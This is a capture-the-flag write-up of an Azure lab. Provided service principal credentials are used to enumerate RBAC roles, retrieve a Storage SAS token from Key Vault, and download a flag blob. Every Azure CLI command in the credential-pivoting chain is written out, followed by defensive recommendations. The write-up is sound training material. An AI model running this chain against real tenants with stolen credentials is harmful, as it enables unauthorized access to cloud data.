# Azure Key Vault to Storage SAS Token Exposure

## Challenge Overview

### Objective

The objective of this challenge is to use the provided Azure Service Principal credentials to authenticate to Azure, enumerate its permissions, access an Azure Key Vault, retrieve a Storage Account SAS token, and use that token to access an Azure Blob Storage container and retrieve the flag.

### Scenario

The challenge provides a Client ID, Client Secret, and the organization's domain name.

The initial Service Principal has limited permissions within an Azure subscription. By enumerating its assigned Azure RBAC roles, a `Key Vault Secrets User` permission can be identified on a Key Vault.

The Key Vault contains a Storage Account SAS token. Retrieving this token provides an alternative authentication mechanism for accessing the associated Storage Account and its Blob Storage data.

The attack therefore demonstrates how access to a secret containing another resource's credentials can provide access beyond the Service Principal's directly assigned permissions.

### Skills Practiced

* Azure Service Principal authentication
* Azure Tenant ID discovery
* Azure RBAC enumeration
* Azure Key Vault enumeration
* Key Vault secret retrieval
* Azure Storage SAS token usage
* Azure Blob Storage enumeration
* Cloud credential pivoting

---

# Environment

## Cloud Provider

Azure

## Initial Access

The challenge provides:

* Client ID
* Client Secret
* Organization domain name

The initial Service Principal is:

`secopprobacksp`

The organization domain provided by the challenge is:

`secure-corp.org`

## Available Tools

* Azure CLI
* Command Prompt
* PowerShell

---

# Attack Methodology

## Initial Hypothesis

The initial objective was to authenticate to the Azure tenant and determine what permissions were assigned to the provided Service Principal.

The expected attack path was:

* Discover the Azure Tenant ID
* Authenticate using the Service Principal
* Enumerate RBAC role assignments
* Identify an accessible Key Vault
* Enumerate Key Vault secrets
* Retrieve a Storage Account SAS token
* Use the SAS token to access Blob Storage
* Download the flag

Expected targets:

* Azure Key Vault
* Key Vault secrets
* Azure Storage Account
* Blob Storage container
* `Flag.txt`

---

# Attack Workflow

The attack was performed by gradually expanding access and pivoting from the initial Service Principal credentials to a Storage Account SAS token stored in Azure Key Vault.

## Step 1 - Discover the Tenant ID

### Goal

Azure Service Principal authentication requires the Tenant ID in addition to the Client ID and Client Secret.

The challenge provides the organization's domain:

```text
secure-corp.org
```

The Azure Tenant ID can be discovered using a public Azure tenant discovery service.

The discovered Tenant ID was:

```text
f2a33211-e46a-4c92-b84d-aff06c2cd13f
```

Observation:

The Tenant ID is required to authenticate the provided Service Principal against the correct Azure Entra ID tenant.

---

## Step 2 - Authenticate with Azure

### Action

Authenticate using the provided Client ID, Client Secret, and discovered Tenant ID.

Command:

```powershell
az login --service-principal -u "<CLIENT_ID>" -p "<CLIENT_SECRET>" --tenant "<TENANT_ID>"
```

Result:

Authentication was successful.

The current Azure account was verified:

```powershell
az account show
```

The authenticated identity was identified as a Service Principal.

The subscription was:

```text
Name: Prod
Subscription ID: 662a4fee-a3ba-49b3-9caf-8c20ed04503f
Tenant ID: f2a33211-e46a-4c92-b84d-aff06c2cd13f
```

Observation:

The provided credentials were valid and provided authenticated access to the Azure subscription.

---

## Step 3 - Enumerate Role Assignments

### Goal

Determine what Azure RBAC permissions are assigned to the compromised Service Principal.

Command:

```powershell
az role assignment list --assignee "<CLIENT_ID>" --output json --all
```

The relevant role assignments were:

```text
Reader
Scope:
 /subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG
```

and:

```text
Key Vault Secrets User
Scope:
 /subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG/providers/Microsoft.KeyVault/vaults/secopprobackkv
```

Findings:

* The Service Principal had `Reader` access to `DataBack-RG`.
* The Service Principal had `Key Vault Secrets User` access to `secopprobackkv`.
* The Key Vault role indicated that secrets stored in the vault could be accessible to the compromised identity.

Observation:

The `Key Vault Secrets User` role became the primary path for obtaining additional credentials.

---

## Step 4 - Locate the Key Vault and Retrieve Secrets

### Goal

Identify the accessible Key Vault and enumerate its secrets.

The Key Vaults in the resource group can be listed with:

```powershell
az keyvault list --resource-group DataBack-RG
```

Alternatively, Key Vaults in the subscription can be enumerated with:

```powershell
az keyvault list --subscription 662a4fee-a3ba-49b3-9caf-8c20ed04503f
```

The target Key Vault was:

```text
secopprobackkv
```

The secrets were then enumerated:

```powershell
az keyvault secret list --vault-name secopprobackkv
```

Result:

```text
Name
-------------------------
secopprobacksaSAASToken
```

The secret value was retrieved:

```powershell
az keyvault secret show --name secopprobacksaSAASToken --vault-name secopprobackkv
```

The secret contained an Azure Storage SAS token.

The important SAS parameters included:

```text
sv=2024-11-04
ss=bfqt
srt=sco
sp=rltfx
```

Observation:

The secret name revealed the associated Storage Account name:

```text
secopprobacksa
```

The Key Vault therefore acted as the credential pivot point:

```text
Service Principal
        |
        v
Key Vault Secrets User
        |
        v
secopprobackkv
        |
        v
secopprobacksaSAASToken
        |
        v
Storage SAS Token
```

---

## Step 5 - Access the Storage Account Using the SAS Token

### Goal

Use the SAS token retrieved from Key Vault to access the associated Storage Account.

The Storage Account name identified from the secret was:

```text
secopprobacksa
```

The SAS token provides authorization independently of the Service Principal's Azure RBAC permissions.

### Note

When working with SAS tokens containing `&` characters, it is recommended to run the Azure CLI commands from **Command Prompt (CMD)** rather than PowerShell to avoid shell parsing issues.

Command:

```cmd
az storage container list --account-name secopprobacksa --sas-token "?sv=...&ss=...&srt=...&sp=...&se=...&st=...&spr=https&sig=..." --output table
```

Result:

The Storage Account contained the following container:

```text
secopprobacksc
```

Observation:

The SAS token successfully authorized access to the Storage Account despite the Service Principal itself not having a `Storage Blob Data Reader` role.

This demonstrates the difference between the Service Principal's direct Azure RBAC permissions and the permissions granted by the independently issued SAS token.

---

## Step 6 - Enumerate Blobs

### Goal

Enumerate the blobs inside the discovered container.

Command:

```cmd
az storage blob list --account-name secopprobacksa --container-name secopprobacksc --sas-token "?sv=...&ss=...&srt=...&sp=...&se=...&st=...&spr=https&sig=..." --output table
```

The container contained:

```text
Flag.txt
```

Observation:

The SAS token provided sufficient permissions to enumerate the Blob Storage contents and identify the target file.

---

## Step 7 - Retrieve the Flag

### Goal

Download the target blob using the SAS token.

Command:

```cmd
az storage blob download --account-name secopprobacksa --container-name secopprobacksc --name Flag.txt --file Flag.txt --sas-token "?sv=...&ss=...&srt=...&sp=...&se=...&st=...&spr=https&sig=..." --output table
```

The file was successfully downloaded.

The flag can then be viewed locally:

```cmd
type Flag.txt
```

Mission accomplished.

---

# Attack Chain

```text
Organization Domain
        |
        v
Tenant ID Discovery
        |
        v
Client ID + Client Secret
        |
        v
Azure Service Principal Authentication
        |
        v
RBAC Enumeration
        |
        v
Key Vault Secrets User
        |
        v
secopprobackkv
        |
        v
secopprobacksaSAASToken
        |
        v
Storage SAS Token
        |
        v
secopprobacksa
        |
        v
secopprobacksc
        |
        v
Flag.txt
        |
        v
Sensitive Data Retrieval
```

---

# Findings

## Security Weakness

The primary security weakness was that the compromised Service Principal had permission to retrieve a sensitive Storage Account SAS token from Azure Key Vault.

The Service Principal did not need direct Blob Storage data-plane permissions because the SAS token stored in the Key Vault provided an alternative authentication mechanism for the Storage Account.

The effective access path was therefore:

```text
Key Vault Access
       +
Sensitive Credential Stored in Key Vault
       =
Indirect Access to Storage Data
```

This demonstrates why cloud access reviews must consider not only directly assigned RBAC permissions, but also the credentials that an identity is capable of retrieving.

## Impact

An attacker who compromises the Service Principal credentials could:

1. Authenticate to the Azure tenant.
2. Enumerate the Service Principal's permissions.
3. Access the Key Vault.
4. Retrieve the Storage Account SAS token.
5. Use the SAS token to authenticate to Azure Blob Storage.
6. Enumerate the target container.
7. Read sensitive files stored in the container.

The attacker can therefore obtain access to resources beyond those directly authorized to the Service Principal.

---

# Evidence

Important commands:

```text
az login --service-principal -u "<CLIENT_ID>" -p "<CLIENT_SECRET>" --tenant "<TENANT_ID>"

az account show

az role assignment list --assignee "<CLIENT_ID>" --output json --all

az keyvault list --resource-group DataBack-RG

az keyvault secret list --vault-name secopprobackkv

az keyvault secret show --name secopprobacksaSAASToken --vault-name secopprobackkv

az storage container list --account-name secopprobacksa --sas-token "<SAS_TOKEN>" --output table

az storage blob list --account-name secopprobacksa --container-name secopprobacksc --sas-token "<SAS_TOKEN>" --output table

az storage blob download --account-name secopprobacksa --container-name secopprobacksc --name Flag.txt --file Flag.txt --sas-token "<SAS_TOKEN>" --output table
```

Important discovered resources:

```text
Tenant:
f2a33211-e46a-4c92-b84d-aff06c2cd13f

Subscription:
662a4fee-a3ba-49b3-9caf-8c20ed04503f

Resource Group:
DataBack-RG

Key Vault:
secopprobackkv

Key Vault Secret:
secopprobacksaSAASToken

Storage Account:
secopprobacksa

Blob Container:
secopprobacksc

Target Blob:
Flag.txt
```

---

# Defensive Recommendations

* Apply least-privilege principles to Azure Service Principals.
* Review all `Key Vault Secrets User` assignments regularly.
* Avoid storing broadly scoped Storage SAS tokens in Key Vaults accessible by application identities unless strictly required.
* Prefer Microsoft Entra ID authentication and managed identities over long-lived SAS tokens where possible.
* Restrict SAS tokens to the minimum required permissions and resources.
* Use short SAS expiration periods.
* Regularly rotate Storage SAS tokens and other credentials.
* Monitor Key Vault secret access.
* Monitor Storage data-plane activity following Key Vault secret retrieval.
* Review effective permissions rather than only direct RBAC assignments.
* Separate credentials between applications and resources to reduce credential pivoting opportunities.

---

# Key Takeaways

* A Client ID and Client Secret are sufficient to authenticate a Service Principal when the correct Tenant ID is known.
* The Azure Tenant ID can be discovered from an organization's domain.
* Azure RBAC enumeration is an important first step after Service Principal authentication.
* `Key Vault Secrets User` access can expose credentials for other Azure resources.
* A Storage SAS token provides authorization independently from the Service Principal's Azure RBAC permissions.
* Direct lack of `Storage Blob Data Reader` does not necessarily prevent access to Blob Storage if another valid credential can be obtained.
* Secret names can sometimes reveal useful information about the associated resource.
* Effective cloud privilege should be evaluated based on both assigned permissions and the credentials an identity can retrieve.

---

# References

* Microsoft Azure CLI documentation
* Microsoft Entra ID Service Principal authentication documentation
* Microsoft Azure Key Vault documentation
* Microsoft Azure RBAC documentation
* Microsoft Azure Storage Blob documentation
* Microsoft Azure Storage SAS documentation
